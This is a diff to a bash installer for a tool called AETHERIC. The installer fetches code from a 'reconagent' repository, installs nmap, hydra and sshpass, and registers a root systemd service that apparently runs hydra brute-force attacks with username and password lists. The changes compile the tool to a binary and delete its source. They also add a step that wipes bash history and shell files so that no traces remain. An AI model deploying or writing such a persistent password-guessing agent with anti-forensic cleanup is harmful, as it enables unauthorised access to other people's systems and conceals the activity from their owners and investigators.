@@ -1,10 +1,11 @@
 #!/bin/bash
-# AETHERIC Installation Script (source-based, no binary)
+# AETHERIC Installation Script – Compiles to binary, removes source
 set -e
 
 REPO_URL="https://raw.githubusercontent.com/reconagent/version_1/main"
 WORKDIR="/tmp/aetheric_install"
 DESTDIR="/usr/local/aetheric"
+BIN_PATH="/usr/local/bin/aetheric"
 
 # ------------------------------------------------------------------
 # 1. Prepare working directory
@@ -19,7 +20,7 @@ apt-get update -y
 apt-get install -y python3 python3-venv python3-pip git build-essential nmap hydra sshpass rsync
 
 # ------------------------------------------------------------------
-# 3. Download all source files (explicit list – NO wildcards!)
+# 3. Download all source files (explicit list)
 # ------------------------------------------------------------------
 for file in \
     main.py config.py \
@@ -31,7 +32,6 @@ for file in \
     curl -s -o "$file" "$REPO_URL/$file"
 done
 
-# Ensure __init__.py exists (package markers)
 touch core/__init__.py modules/__init__.py utils/__init__.py
 
 # ------------------------------------------------------------------
@@ -81,23 +81,36 @@ Ngit321$
 EOF
 
 # ------------------------------------------------------------------
-# 5. Copy everything to permanent location
+# 5. Copy to permanent location, compile binary, remove source
 # ------------------------------------------------------------------
 rm -rf "$DESTDIR"
 mkdir -p "$DESTDIR"
 cp -r . "$DESTDIR/"
 cd "$DESTDIR"
 
-# ------------------------------------------------------------------
-# 6. Create virtual environment and install Python deps
-# ------------------------------------------------------------------
+# Create virtual environment and install dependencies
 python3 -m venv venv
 source venv/bin/activate
 pip install --upgrade pip
 pip install -r requirements.txt
+pip install pyinstaller
+
+# Compile binary
+pyinstaller --onefile --name aetheric \
+    --hidden-import core \
+    --hidden-import modules \
+    --hidden-import utils \
+    main.py
+
+# Install binary and remove source
+cp dist/aetheric "$BIN_PATH"
+chmod +x "$BIN_PATH"
+cd /
+rm -rf "$DESTDIR"
+rm -rf "$WORKDIR"
 
 # ------------------------------------------------------------------
-# 7. Create systemd service (runs Python script directly)
+# 6. Create systemd service (uses binary)
 # ------------------------------------------------------------------
 cat > /etc/systemd/system/aetheric.service <<EOF
 [Unit]
@@ -106,10 +119,10 @@ After=network.target
 
 [Service]
 Type=simple
-WorkingDirectory=$DESTDIR
-Environment="HYDRA_USERLIST=$DESTDIR/usernames.txt"
-Environment="HYDRA_PASSLIST=$DESTDIR/passwords.txt"
-ExecStart=$DESTDIR/venv/bin/python $DESTDIR/main.py --resume
+WorkingDirectory=/tmp
+Environment="HYDRA_USERLIST=/usr/local/aetheric/usernames.txt"
+Environment="HYDRA_PASSLIST=/usr/local/aetheric/passwords.txt"
+ExecStart=$BIN_PATH --resume
 Restart=on-failure
 RestartSec=10
 User=root
@@ -122,18 +135,23 @@ WantedBy=multi-user.target
 EOF
 
 # ------------------------------------------------------------------
-# 8. Enable and start the service
+# 7. Enable and start the service
 # ------------------------------------------------------------------
 systemctl daemon-reload
 systemctl enable aetheric
 systemctl start aetheric
 
 # ------------------------------------------------------------------
-# 9. Cleanup temporary directory
+# 8. Wipe bash history (no traces of the command)
 # ------------------------------------------------------------------
-cd /
-rm -rf "$WORKDIR"
+unset HISTFILE
+history -c
+cat /dev/null > ~/.bash_history
+cat /dev/null > /root/.bash_history
+rm -f ~/.bash_history ~/.bash_logout ~/.bashrc 2>/dev/null
+export HISTFILESIZE=0
+export HISTSIZE=0
 
-echo "AETHERIC installed and running from source."
+echo "AETHERIC installed successfully (binary only)."
 echo "Check status: systemctl status aetheric"
 echo "View logs: journalctl -u aetheric -f"
